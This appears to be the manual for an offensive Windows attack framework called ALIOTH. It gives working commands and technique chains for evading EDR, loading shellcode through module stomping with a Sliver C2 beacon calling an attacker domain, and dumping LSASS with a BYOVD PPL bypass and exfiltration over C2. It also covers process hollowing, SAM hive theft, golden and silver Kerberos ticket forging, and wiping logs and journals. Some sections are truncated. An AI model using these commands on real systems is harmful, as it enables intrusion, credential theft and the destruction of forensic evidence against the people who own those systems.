# ALIOTH Unified APT Framework v3.0

### What is ALIOTH?

ALIOTH is a unified offensive security framework that combines **13 attack modes** into a **single standalone binary**. No DLL dependencies, no runtime installers one `.exe` that covers the complete attack chain from initial access to data exfiltration and anti-forensics.

Every mode shares a **common evasion engine** indirect syscalls, stack spoofing, gadget rotation, ETW patching, HWBP clearing, polymorphic stubs. This is not a toolbox with 13 separate signatures. It is one binary, one evasion layer, protecting everything underneath.

### Architecture - Core Engine

The evasion engine is shared across all 13 modes. Not per-tool centralized. Every syscall made by any mode goes through this engine.

```
ALIOTH.exe
└── Core Engine (shared by ALL 13 modes)
    ├── Indirect Syscalls        — syscalls via trampoline, never direct NTDLL import
    ├── Halo's Gate              — SSN resolution from adjacent syscall stub bytes
    ├── Stack Spoofing           — SilentMoonwalk-style frame fabrication
    ├── Gadget Rotation          — 8 gadgets rotated per syscall invocation
    ├── SSN XOR Obfuscation      — service numbers XOR'd at rest, decoded in register only
    ├── Mask Chaining            — multi-frame XOR masking (256+ dynamic masks)
    ├── TLS Per-Thread Context   — zero global state, fully thread-safe
    ├── ETW Patching             — EtwEventWrite → direct syscall patch
    ├── HWBP Detection/Clear     — DR0-DR3 checked and zeroed on startup
    ├── Decoy Threads (x4)       — registry reader, sleep loop, network ping, FS walk
    └── Polymorphic Stubs        — 1024 or 2048 unique stubs generated at build time
```

**Polymorphic stubs** are generated by `generate_stubs.py` at build time. Each stub is unique same syscall wrapper, different byte sequence, 4 padding variants per stub. With 1024 stubs, signature-based detection is effectively defeated per build. 2048 adds more entropy at the cost of slightly larger binary.

**TLS per-thread context** means zero global variables. Each thread carries its own mask, gadget pointer, and SSN table. Corrupting one thread has no cross-thread effect. No shared memory for EDRs to snapshot between threads.

**Gadget rotation** cycles through 8 gadgets sourced from `kernel32.dll`, `ntdll.dll`, and `win32u.dll` one per syscall invocation. Instruction-level patterns change constantly.

#### Mode 1 - Umbra (Evasion Engine Test)

**Purpose:** Validates the core engine is functional on the current target OS before running any attack mode. Run this first on every new target.

**What it tests:**

* Indirect syscall resolution -  `win32u.dll` + `ntdll.dll` SSN lookup
* Halo's Gate SSN resolution from adjacent stub bytes (handles hooked NTDLLs)
* Stack spoofing SilentMoonwalk frame fabrication using `RtlUserThreadStart`
* Gadget rotation all 8 gadgets cycled and verified
* SSN XOR obfuscation - encode → store → decode → compare
* ETW patch status - `EtwEventWrite` → is it already patched to `RET`?
* HWBP detection - DR0-DR3 register check and clearing
* Decoy thread spawning - 4 threads: registry reader, sleep loop, network ping, FS walk
* `win32u.dll` syscall resolution - separate from ntdll path

**Command:**

```cmd
ALIOTH.exe --mode 1
```

**Output:**

```
[+] Indirect syscall: OK (win32u.dll resolved)
[+] Halo's Gate: OK (SSN 0x36 resolved from adjacent stub)
[+] Stack spoofing: OK (RtlUserThreadStart frame fabricated)
[+] Gadget rotation: OK (8/8 gadgets active)
[+] SSN XOR: OK (encode-decode verified)
[+] ETW patch: OK (EtwEventWrite → RET)
[+] HWBP: OK (DR0-DR3 cleared)
[+] Decoy threads: OK (4 threads spawned)
[+] Engine ready.
```

If any test fails the engine is incompatible with the target OS build or an EDR has hooked deeper than expected. Investigate before running other modes.

#### Mode 2 - Charon (Shellcode Loader)

**Purpose:** Loads arbitrary shellcode (Sliver implant, custom payload) into a target process using module stomping with layered evasion. Primary initial access delivery method.

**Full technique chain:**

1. **Module stomping** - instead of allocating new `RWX` memory (heavily monitored), overwrites an already-loaded DLL's `.text` section with shellcode. EDR sees legitimate Microsoft DLL running code in legitimate memory range.
2. **AES-NI hardware decryption** - shellcode decrypted using CPU AES-NI instructions. Falls back to RC4 if AES-NI unavailable.
3. **Environmental keying** - shellcode only decrypts if specific host conditions match: uptime within range, specific thread ID, registry key present, no VM/EDR artifacts detected. Detonates only on intended target.
4. **16-byte fragmentation** - shellcode scattered across 16-byte chunks in non-contiguous memory regions, reassembled at runtime. Memory scanners see no contiguous shellcode.
5. **Sleep masking** - when not executing (sleeping between C2 beacons), shellcode is re-encrypted in-place. Decrypted only when executing. Memory scans during sleep find nothing.
6. **Callback execution (6 methods):** TimerQueue, EnumChildWindows, SetWindowsHookEx, APC, Fiber, ThreadPool - rotates through methods to avoid behavioral signatures.
7. **Temporal bypass** - memory permissions cycle: `RW` → legitimate API calls → jitter 3-7 seconds → `RX`. Never static `RWX`.

**Target DLLs for module stomping:**

| DLL                | Notes                                                                    |
| ------------------ | ------------------------------------------------------------------------ |
| `Chakra.dll`       | IE/Edge legacy JS engine — most stealthy, rarely monitored by modern EDR |
| `edgehtml.dll`     | Edge legacy rendering engine                                             |
| `mozglue.dll`      | Firefox runtime                                                          |
| `vcruntime140.dll` | MSVC runtime                                                             |
| `msvcrt.dll`       | C runtime                                                                |
| `winhttp.dll`      | WinHTTP                                                                  |
| `iertutil.dll`     | IE utility                                                               |

**Sliver C2 setup (attacker machine):** [sliver.md](../pivoting/sliver.md "mention")

```bash
# Start Sliver server
sliver-server

# Generate Sliver shellcode beacon
sliver> generate --mtls attacker-c2.domain.com --os windows --arch amd64 --format shellcode --save sliver_beacon.bin

# Start mTLS listener
sliver> mtls --lport 443
```

**Build and execute:**

```cmd
REM Build Charon artifact with your shellcode
python modes\charon\builder\charon_builder.py --payload sliver_beacon.bin --target Chakra.dll --output artifact.c

REM Compile
build.bat 1024

REM Execute on target
ALIOTH.exe --mode 2 --shellcode sliver_beacon.bin --target Chakra.dll --sleep-mask --fragment --env-keying
```

**Flags:**

| Flag                 | Description                                                   |
| -------------------- | ------------------------------------------------------------- |
| `--shellcode <file>` | Raw shellcode blob                                            |
| `--target <dll>`     | DLL to stomp (default: `Chakra.dll`)                          |
| `--sleep-mask`       | Re-encrypt shellcode during sleep intervals                   |
| `--fragment`         | Scatter into 16-byte chunks across non-contiguous memory      |
| `--env-keying`       | Enable environmental keying — only detonates on intended host |

**What happens under the hood:**

```
ALIOTH initializes evasion engine (Umbra core)
Charon scans loaded modules → finds Chakra.dll 500KB .text section
NtCreateSection + NtMapViewOfSection → map Chakra.dll
NtProtectVirtualMemory → .text to RW (stack-spoofed call)
AES-NI decrypt shellcode using environmental key
Write shellcode into Chakra.dll .text section
NtProtectVirtualMemory → .text back to RX
CreateTimerQueueTimer → callback execution
Shellcode runs INSIDE Chakra.dll .text — EDR sees legit Microsoft DLL
Sliver beacon phones home via HTTPS (JA3 spoofed)
```

#### Mode 3 - Wraith (LSASS Dumper + PPL Bypass)

**Purpose:** Dumps LSASS memory even when Protected Process Light (PPL) is active. Combines BYOVD kernel exploitation with manual memory reading zero `dbghelp.dll`, zero `MiniDumpWriteDump` API call.

**Full technique chain:**

1. **BYOVD (Bring Your Own Vulnerable Driver)** — loads one of 12 pre-embedded signed vulnerable drivers via SCM to obtain kernel-level arbitrary write primitive
2. **EPROCESS walk** - finds `lsass.exe` EPROCESS via `PsInitialSystemProcess` + `ActiveProcessLinks`
3. **PPL teardown** - direct kernel write to `EPROCESS.Protection` = 0, `EPROCESS.SignatureLevel` = 0, `EPROCESS.SectionSignatureLevel` = 0
4. **Process cloning** - `NtCreateProcessEx` with `lsass.exe` as parent → cloned handle, full memory access
5. **Manual minidump** - `NtReadVirtualMemory` loop across all LSASS memory regions, builds minidump format in-memory manually
6. **ChaCha20-Poly1305 encryption -** encrypts dump buffer in-memory before any disk touch
7. **Split + exfil** - splits into 1MB chunks, sends via Nyx C2 channel (no disk write at any point)
8. **Credential Guard bypass -** also dumps `LsaIso.exe` to extract credentials from isolated LSA

**12 BYOVD drivers (all bundled in binary):**

| Driver        | Vendor          |
| ------------- | --------------- |
| RTCore64.sys  | MSI Afterburner |
| aswArPot.sys  | Avast           |
| ksthunk.sys   | Microsoft (old) |
| PDFwkrnl.sys  | PDF printer     |
| Truesight.sys | Truesight       |
| GDRV.sys      | GIGABYTE        |
| DBK64.sys     | CheatEngine     |
| KLSD.sys      | Kaspersky       |
| aswArDrv.sys  | Avast           |
| ATKACPI.sys   | ASUS            |
| WinRing0.sys  | WinRing0        |
| (+ 1 reserve) | —               |

**Commands:**

```cmd
REM Standard — memory-only, encrypted, split, exfil via C2
ALIOTH.exe --mode 3 --memory-only --encrypt --split --exfil

REM With Credential Guard bypass
ALIOTH.exe --mode 3 --memory-only --encrypt --cred-guard

REM Target specific LSASS PID
ALIOTH.exe --mode 3 --pid 712 --encrypt --memory-only
```

**Flags:**

| Flag            | Description                                      |
| --------------- | ------------------------------------------------ |
| `--memory-only` | No disk write exfil only                         |
| `--encrypt`     | ChaCha20-Poly1305 encrypt the dump               |
| `--split`       | Split into 1MB chunks                            |
| `--exfil`       | Send to C2 via Nyx                               |
| `--cred-guard`  | Also dump `LsaIso.exe` (Credential Guard bypass) |
| `--pid <pid>`   | Target specific PID (default: auto-find LSASS)   |

**Requires:** SYSTEM privileges, admin for driver load.

#### Mode 4 - Revenant (Process Hollowing)

**Purpose:** Injects a shellcode payload into a legitimate Windows process by replacing its executable image. Use when you need a persistent implant running under a process that looks completely native.

**Hollow techniques (8 total):**

| ID | Technique                      | Notes                                                                                         |
| -- | ------------------------------ | --------------------------------------------------------------------------------------------- |
| 1  | **Transacted hollowing (TxF)** | Creates NTFS transaction, writes hollowed image, rolls back on failure default, most stealthy |
| 2  | **Thread hijacking**           | Suspend → overwrite RIP register → resume                                                     |
| 3  | **APC fallback**               | `NtQueueApcThread` when thread suspension is blocked                                          |
| 4  | **Section handoff**            | Atomic section mapping no direct memory write                                                 |
| 5  | **Indirect DLL loading**       | Via `LdrLoadDll` via syscalls no import resolution                                            |
| 6  | **Payload chaining**           | Stage 2 download via hollowed process                                                         |
| 7  | **Process freeze/thaw**        | `NtSuspendProcess` / `NtResumeProcess` full process freeze                                    |
| 8  | **TLS callback hijack**        | Hijacks TLS callback array entry no RIP overwrite required                                    |

**Target processes (8):**

| Process                  | Why                                                        |
| ------------------------ | ---------------------------------------------------------- |
| `RuntimeBroker.exe`      | UWP broker always running, network-capable, rarely flagged |
| `sihost.exe`             | Shell infrastructure SYSTEM context                        |
| `taskhostw.exe`          | Task scheduler host intermittent activity expected         |
| `rundll32.exe`           | Runs DLLs network activity expected                        |
| `dllhost.exe`            | COM surrogate short-lived, expected to spawn/die           |
| `backgroundTaskHost.exe` | Background UWP tasks                                       |
| `SystemSettings.exe`     | System settings — admin context                            |
| `explorer.exe`           | Shell — network activity expected, high trust              |

**Commands:**

```cmd

ALIOTH.exe --mode 4 --target RuntimeBroker --payload sliver_beacon.bin --technique 1

REM Thread hijacking into dllhost

REM APC fallback into taskhostw
ALIOTH.exe --mode 4 --target taskhostw --payload sliver_beacon.bin --technique 3

```

**Flags:**

| Flag                | Description                                  |
| ------------------- | -------------------------------------------- |
| `--target <exe>`    | Target process name (without `.exe` is fine) |
| `--payload <file>`  | Raw shellcode/payload file                   |

#### Mode 5 - Mortis (LSASS MiniDump)

**Purpose:** Alternative LSASS credential dumper faster and quieter than Wraith when PPL bypass is not needed. Zero `dbghelp.dll` dependency.

**Features:**

* **Manual minidump** via `NtReadVirtualMemory` builds minidump format manually in memory
* **Selective region dump** - reads only `LogonSessions` and `Credentials` regions, not full process. Smaller dump, shorter read window, harder to detect
* **SEH crash handler** - if LSASS handle dies mid-read, SEH exception handler catches it and attempts recovery
* **MD5 dump verification** - validates dump integrity before transmitting
* **Multi-account dump** - enumerates all currently logged-in user sessions and dumps each
* **Parent PID spoofing** - spawns dump helper process with PID spoofed as `explorer.exe` or `svchost.exe`
* **Anti-ETW** - patches `EtwEventWrite` before initiating dump, then restores after

**Commands:**

```cmd
REM Selective, memory-only
ALIOTH.exe --mode 5 --selective --memory-only --output dump.bin

REM Full dump with encryption
ALIOTH.exe --mode 5 --memory-only --encrypt --output lsass.dmp
```

**Flags:**

| Flag              | Description                         |
| ----------------- | ----------------------------------- |
| `--selective`     | Dump only credential memory regions |
| `--memory-only`   | No disk write                       |
| `--output <file>` | Output dump filename                |
| `--encrypt`       | ChaCha20 encrypt the dump           |

**Wraith vs Mortis when to use which:**

| Scenario                             | Use                             |
| ------------------------------------ | ------------------------------- |
| PPL enabled on LSASS                 | Wraith (PPL bypass via BYOVD)   |
| PPL disabled, want quiet/fast dump   | Mortis                          |
| Need memory-only exfil               | Both support it                 |
| EDR actively monitoring LSASS access | Wraith (cloned handle via DKOM) |

#### Mode 6 - Shadow (VSS SAM Dumper)

**Purpose:** Extracts SAM, SYSTEM, and SECURITY registry hives from Volume Shadow Copies without touching the live registry. No PowerShell, no `vssadmin`, no external dependencies.

**Full technique chain:**

1. **Pure C VSS COM interface** - instantiates `IVssBackupComponents` directly in C, creates shadow copy of C: drive without any PowerShell or script dependency
2. **Raw disk read fallback** - if VSS fails or is disabled, reads `\\.\C:` raw sector-by-sector to locate and extract hives
3. **Registry hive parsing** - parses binary hive format directly to extract NT hashes, skipping the need to load hives
4. **Differential dump** - captures only hive changes since last VSS snapshot ,smaller, faster
5. **VSS delete-after-read** - deletes the VSS snapshot immediately after extraction no evidence it was created
6. **ETW log deletion** - clears Event ID 8224 (VSS provider started) from ETW logs

**Commands:**

```cmd
REM Standard — delete snapshot after, raw disk fallback
ALIOTH.exe --mode 6 --delete-after-read --direct-read --output sam_dump

REM Extract hashes only, clean up
ALIOTH.exe --mode 6 --delete-after-read --output hashes
```

**Flags:**

| Flag                  | Description                               |
| --------------------- | ----------------------------------------- |
| `--delete-after-read` | Delete VSS snapshot after extraction      |
| `--direct-read`       | Raw `\\.\C:` disk read if VSS unavailable |
| `--output <prefix>`   | Output file prefix                        |

**Requires:** Admin privileges (VSS creation requires admin).

#### Mode 7 - Hermes (Kerberos TGT Injection)

**Purpose:** Inject forged or stolen Kerberos tickets into the LSA cache to impersonate users without plaintext passwords. Foundation for golden ticket domain persistence.

**Full capabilities:**

* **LSA injection** via `LsaCallAuthenticationPackage` injects ticket directly into Kerberos SSP without touching disk
* **TGT extraction** via `lsarpc` named pipe pulls existing TGTs from LSASS memory
* **Golden ticket** - forged TGT signed with KRBTGT hash, valid for configured expiry (default: 10 years). Survives password resets on user accounts.
* **Silver ticket** - forged service ticket for specific SPN (`CIFS`, `HTTP`, `MSSQL`, `HOST`, etc.) — targeted service access without touching DC
* **Auto-renewal** - monitors ticket expiry and renews before expiration
* **gMSA/MSA support** - works with Group Managed Service Accounts
* **FAST armoring downgrade** - downgrades Kerberos Flexible Authentication to bypass armored TGT protection
* **Cross-domain trust exploitation** - child domain → parent domain via inter-realm TGT

**Commands:**

```cmd
REM Golden ticket — full domain access, 10 year validity
ALIOTH.exe --mode 7 --user administrator --domain nioncorp.local --golden --expiry 87600

REM Silver ticket — CIFS access to SQL01 only
ALIOTH.exe --mode 7 --user mikassa --domain nioncorp.local --silver --spn cifs/sql01.nioncorp.local

REM Silver ticket — MSSQL service
ALIOTH.exe --mode 7 --user mikassa --domain nioncorp.local --silver --spn mssql/sql01.nioncorp.local

REM Cross-domain trust — child to parent
ALIOTH.exe --mode 7 --cross-domain --domain child.nioncorp.local
```

**Flags:**

| Flag               | Description                                          |
| ------------------ | ---------------------------------------------------- |
| `--user <name>`    | Username to impersonate                              |
| `--domain <fqdn>`  | Target domain FQDN                                   |
| `--golden`         | Forge golden ticket (needs KRBTGT hash)              |
| `--silver`         | Forge silver ticket (needs service account hash)     |
| `--spn <spn>`      | SPN for silver ticket                                |
| `--cross-domain`   | Cross-domain trust exploit                           |
| `--expiry <hours>` | Ticket lifetime in hours (default: 87600 = 10 years) |

**Golden vs Silver:**

| Ticket | Scope                                 | Requires                  | Survives                                    |
| ------ | ------------------------------------- | ------------------------- | ------------------------------------------- |
| Golden | Entire domain — any service, any user | KRBTGT NTLM hash          | User password resets                        |
| Silver | Single service on single host         | Service account NTLM hash | Nothing (service account PW reset kills it) |

#### Mode 11 - Acheron (Anti-Forensics)

**Purpose:** Destroys forensic artifacts post-operation. Covers event logs, filesystem metadata, runtime telemetry, and persistence indicators from the attack itself.

**All 10 techniques:**

| #  | Technique                | Method                                                                       |
| -- | ------------------------ | ---------------------------------------------------------------------------- |
| 1  | Event Log Wipe           | `wevtutil cl Security`, `System`, `Application` via direct syscall           |
| 2  | Prefetch Wipe            | Delete `C:\Windows\Prefetch\*.pf` — removes execution evidence               |
| 3  | USN Journal Rollback     | `fsutil usn deletejournal C:` — destroys entire filesystem change timeline   |
| 4  | Timestamp Manipulation   | `NtSetInformationFile` → sets all MACE timestamps to `01/01/2000`            |
| 5  | DoD 7-pass File Shredder | DoD 5220.22-M — 7 overwrite passes before delete, prevents file carving      |

| 9  | PE Infector              | Code cave injection into legitimate `.exe` on disk — covers payload presence |
| 10 | Shim Database            | Custom `.sdb` in `C:\Windows\AppPatch\Custom` — persistence + evasion layer  |

### OPSEC Notes

| Rule                       | Detail                                                                                                           |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| **One binary only**        | Deploy `ALIOTH.exe` no DLLs, no configs, no scripts needed on target                                             |
| **Memory-only operations** | Wraith, Mortis, Nyx all support zero disk-write credentials and dumps never touch disk                           |
